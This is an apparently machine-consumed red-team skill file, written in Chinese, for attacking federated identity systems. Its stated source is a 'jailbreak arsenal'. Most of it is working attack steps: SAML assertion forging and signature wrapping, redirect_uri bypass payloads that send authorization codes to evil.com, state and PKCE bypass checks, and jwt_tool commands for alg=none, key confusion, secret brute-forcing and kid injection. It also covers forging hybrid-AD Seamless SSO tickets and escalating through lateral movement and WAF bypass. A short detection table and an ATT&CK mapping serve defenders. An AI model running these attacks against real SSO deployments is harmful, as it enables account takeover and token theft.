---
name: identity-federation
description: Use for authorized assessment of federated identity systems including SAML, OIDC, OAuth2 flows, SSO misconfiguration, and token confusion issues.
whenToUse: Use for authorized assessment of federated identity systems including SAML, OIDC, OAuth2 f
source: dsh-jailbreak-arsenal@1.7.0 bundled_skills（已按本仓格式改写，非照抄）
---

# Identity Federation (SAML / OIDC / OAuth)

## 适用场景

- SAML Response 签名/断言篡改面（经典缺陷模式）
- OIDC 隐式/授权码 + PKCE 缺失
- redirect_uri / state / nonce 问题
- IdP 与 SP 元数据、多租户 issuer 混淆
- 与 `api-security` JWT 攻击互补（本 skill 偏联邦与 SSO 流）

## 工作流

### 0. 先画流，再动手

联邦协议的漏洞几乎全出在**「两方对同一段数据的理解不一致」**上。所以第一步不是找 payload，是把流画清楚：

```
浏览器 → SP(/authorize) → IdP(登录) → 回调 SP(?code=...&state=...)
                                        ↓
                                   SP 后端 → IdP(/token) → 拿 id_token/access_token
```

每一跳都要问三个问题：**这里有没有签名？签的是哪一段？谁来验？** 三个答案任何一个含糊，就是攻击点。

### 1. 元数据侦察（免费信息，先拿）

```bash
# OIDC：配置全在这里，很多问题一眼看出
curl -s https://<sp-or-idp>/.well-known/openid-configuration | jq

# 重点看这几个字段：
#   authorization_endpoint / token_endpoint   → 真实的攻击面
#   response_types_supported                   → 有没有 implicit（有就危险）
#   grant_types_supported                      → 有没有 password / client_credentials
#   id_token_signing_alg_values_supported       → 有没有 RS256/HS256 混用
#   code_challenge_methods_supported            → 缺 S256 = PKCE 降级

# SAML：拿 metadata XML
curl -s https://<sp>/saml/metadata
curl -s "https://<idp>/FederationMetadata/2007-06/FederationMetadata.xml"
```

**判据**：`response_types` 含 `token`/`id_token`（implicit）→ 直接去 §3；`code_challenge_methods_supported` 缺 `S256` 只留 `plain` → 去 §4。

### 2. SAML 断言篡改（最经典，也最容易复现）

SAML 的签名只保护**被签名的那一段**。绕过方式取决于 XML 解析器怎么对待「没签名的那份」。

| 手法 | 原理 | 触发条件 |
|---|---|---|
| **签名剥离** | 删掉 `<Signature>`，服务端不验就放过 | SP 未强制验签 |
| **签名位置搬移** | 把合法签名搬到攻击者伪造的 `<Assertion>` 里 | 验签只查「XML 里有 Signature」，不查「签的是不是这个 Assertion」 |
| **XML Signature Wrapping（XSW）** | 保留原签名断言，另塞一个伪造断言，诱导解析器取伪造的那份 | 解析器与验签器取节点的 XPath 不一致 |
| **注释截断** | `admin@evil.com<!-- -->.gov` 之类，让提取邮箱的逻辑与验签逻辑看到不同内容 | 用正则而非 XML 解析取字段 |
| **算法降级** | 把 `RSA-SHA256` 改成 `RSA-SHA1` 或 `none` | 服务端接受多算法且不白名单 |

```bash
# 判定是否可剥离：抓一个正常 SAML Response 解 base64 看结构
echo '<base64_response>' | base64 -d | xmllint --format -

# 改完再编回去
cat forged.xml | base64 -w0 > payload.b64
# 然后 POST 到 /saml/acs（断言消费端点，SP 的固定入口）
curl -s -X POST https://<sp>/saml/acs \
  --data-urlencode "SAMLResponse=$(cat payload.b64)" \
  --data-urlencode "RelayState=<原值>" -i
```

**关键**：`RelayState` 必须保留原值，否则会被当成 CSRF 直接拒掉——这是最常见的「以为打不中其实是自己写错」。

### 3. OIDC / OAuth2：四类真实可打的缺陷

**① redirect_uri 校验不严（最高产）**

```bash
# 试探四种放宽：路径追加 / 子域 / 大小写 / 参数注入
https://<idp>/authorize?...&redirect_uri=https://<sp>/callback/../../evil
https://<idp>/authorize?...&redirect_uri=https://<sp>.evil.com/callback
https://<idp>/authorize?...&redirect_uri=https://<sp>/callback?x=https://evil.com
https://<idp>/authorize?...&redirect_uri=https://<sp>/callback%23@evil.com
```

**判据**：code 被送到非白名单地址 = 漏洞；只回显错误页 = 校验有效，转下一类。

**② state 缺失 / 不绑定 → CSRF 式账号劫持**

没有 `state` 或 `state` 不复用校验，攻击者可以把自己的 `code` 塞给受害者，让受害者登录成攻击者的账号（后续在受害者账号里存恶意数据）。

```bash
# 观察：正常流里删掉 state 参数，服务端还认不认
curl -s -o /dev/null -w "%{http_code}" "https://<sp>/callback?code=<victim_code>"
# 200 且建立会话 = state 未校验
```

**③ PKCE 降级**

```bash
# 带 code_challenge 走一遍；再不带 code_verifier 换 token，看是否仍然成功
curl -s -X POST https://<idp>/token -d "grant_type=authorization_code&code=<c>&client_id=<id>"
# 缺 code_verifier 却成功 = PKCE 没强制，授权码可被第三方兑换
```

**④ token 混淆（cross-client / cross-audience）**

```bash
# 拿 A 应用的 access_token，去访问 B 应用的 API
curl -s https://api-b/me -H "Authorization: Bearer <token_from_app_A>"
# 200 = audience 校验缺失
```

### 4. JWT 攻击（联邦场景最常见的是这四种）

```bash
# ① alg=none
python3 jwt_tool.py <token> -X a

# ② HS256 用公钥当密钥（RS256→HS256 混淆）
python3 jwt_tool.py <token> -X k -pk pubkey.pem

# ③ 弱密钥爆破
python3 jwt_tool.py <token> -C -d rockyou.txt

# ④ kid 注入（kid 指向可预测路径 / 命令注入）
python3 jwt_tool.py <token> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

**深一点的看 `claims`**：`aud`、`iss`、`exp`、`nbf`、`sub` 五个里只要有一个不验，就有文章。`aud` 不验 → 跨应用；`iss` 不验 → 换 IdP；`exp` 不验 → 永久票据。

### 5. 与 AD 的接合点（混合身份最容易出问题）

企业里常见「本地 AD + 云 IdP」双轨，两边的账号映射是薄弱点：

| 场景 | 攻击点 | 落地 |
|---|---|---|
| Azure AD Connect 同步 | 本地改密码同步到云，或反向 | 本地拿到用户 → 改密码 → 登云 |
| 联合域信任 | 信任方向判错 → 低权域打高权域 | `nltest /domain_trusts` 看方向 |
| Seamless SSO | 桌面 SSO 票据（`AZUREADSSOACC$` 机器账号哈希） | 拿到哈希可伪造任意用户 SSO |
| 密码哈希同步（PHS） | 云侧存的是哈希 | 云管理员可直接改任意人密码 |

```bash
# 看信任关系与方向（在已控域内）
nltest /domain_trusts /all_trusts /v
# SID 过滤是否开启：开着则无法跨域做 SID History 注入
```

## 检测视角（防守方在日志里看到什么）

| 动作 | 防守方看哪里 | 典型信号 |
|---|---|---|
| SAML 断言篡改 | IdP/SP 的 SAML 响应日志 | 同一 `AssertionID` 被重复消费；签名验证失败但请求继续处理 |
| redirect_uri 绕过 | IdP 授权日志 | `redirect_uri` 与注册值不完全相等却签发 code |
| state 缺失 | SP 会话日志 | 回调请求无 `state` 却建立新会话 |
| JWT alg=none | API 网关 | `alg` 字段异常；签名校验被跳过 |
| 跨 audience 用 token | 资源服务器 | `aud` 与自身 client_id 不匹配却返回 200 |
| Seamless SSO 滥用 | DC 4768/4769 | `AZUREADSSOACC$` 机器账号出现异常 Kerberos 请求 |

## 工具链

| 工具 | 用途 |
|------|------|
| Burp + SAML Raider | 断言编辑与 XSW 构造（授权） |
| `jwt_tool` | JWT 六类攻击一键 |
| 浏览器 DevTools | 抓完整重定向链（关键：看每一步的 URL 参数） |
| `curl` + `jq` | 元数据批量核对 |
| IdP 管理日志 | 审计侧证据（写报告用） |

**降级路线**：`SAML Raider` 装不上 → 手工 base64 + `xmllint` 改 XML；`jwt_tool` 缺 → `python3 -c` 手工改 base64url 段（`header.payload.signature` 三段各自 base64url 解码后改）。

## 参考

- `references/sso-flow-checklist.md`
- `../api-security/`（纯 API JWT 部分）
- `../windows-ad/`（企业 IdP 与 AD 的接合）

## 路由上下文

**上游**: MASTER R37  
**下游**: 纯 API JWT → api-security；云 IdP → cloud-k8s

## 任务完成自检

- [ ] 是否映射完整 SSO 流？
- [ ] 每个 Finding 是否有复现与影响？
- [ ] Checklist？

## 本机工具实况（导入时快照；当前真值用 `npm run toolkit:check` 或 `node scripts/sync-tool-status.mjs` 复核——表会过期，命令不会）

| 工具 | 状态 |
| --- | --- |
| `burp` | ❌ 未装（用前先装，或改用等价工具） |



<!-- second-shot:start scripts/inject-second-shot.mjs 生成，勿手改 -->

## 第二发（主力打不出去时，按这个顺序换）

1. **同类替代**（链路里的互补技能，手法最接近）：`windows-ad`

2. **前提没满足就先回去**：`windows-ad`、`lateral-movement` —— 上一环没做实，本环再试也是空打

3. **无回显 / 被拦**：先用 `oob-verification` 确认是不是真没打进去（没回显 ≠ 没命中）；确认被 WAF 拦就转 `waf-bypass`

4. **目标比预期更深**：换到同主题的专项靶子面 `competition-oauth-oidc-chain`

**纪律**：同一手法不许连打三次（第一次是验证、第二次换参数、第三次必须换手法）；换完还不动，就**如实回报**试过哪几条、各自现象是什么——这是下一次改打的依据，不是失败。

second-shot:end -->

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：5 内网渗透｜**角色**：`internal`
- **上游**（先做完这些再进来）：`windows-ad`
- **下游**（产出交给谁）：`cloud-k8s`、`competition-oauth-oidc-chain`
- **专项下游**（同主题更深的靶子面）：`competition-oauth-oidc-chain`
- **互补**（同类场景一起用）：`windows-ad`
- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`credential`、`access` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据
- **收口必做**（打完不算完，要能证明）：命中判定走 `verification-discipline`（误报排除 + 修复五档判定）；打完之后要**补丁后复测**（补丁/修复后再打一遍，确认真的关掉了，而不是换个入口还能打）也走它；说清对手能不能发现走 `detection-pairing`（检测规则 + 响度）；战果归到哪个战术走 `attack-traceability`（ATT&CK 映射）。**出交付物用 `redteam_report`**（kind=score 出计分战报、kind=targets 出靶标清单），整条链路串起来看用 `redteam_attack_chain` / `redteam_attack_path` —— 这两个只在 `redteam-setup` 的工具表里登记过，做具体攻击时不会想到去翻，所以在这里点名

- **配套工具**（做完这步要落库/查询时用，别只记在上下文里）：`redteam_sessions`（一屏看已上线 WebShell、隧道可达网段、凭据、访问会话）；`redteam_sessions`（同上：判断现在能往哪走，别凭记忆）

<!-- /skill-link-graph -->

## ATT&CK 映射

> 本技能会执行的手法对应 MITRE ATT&CK v20.1 下列技术（编号来自 `lib/redteam/attack-map.js`，唯一来源）。

| 战术 | 编号 | 技术 |
| --- | --- | --- |
| 凭据访问 | T1528 | 窃取应用访问令牌 |
| 凭据访问 | T1606 | 伪造凭据 |
| 横向移动 | T1550 | 使用备用认证材料 |

落到事实库时，把这几个编号写进 `attack_step` 的标题或 `detail`：报告与检测配对要靠它们对齐；
**没写编号的动作在「按 ATT&CK 复核」时等于不存在**（防守方按技术编号查日志，查不到就是漏）。
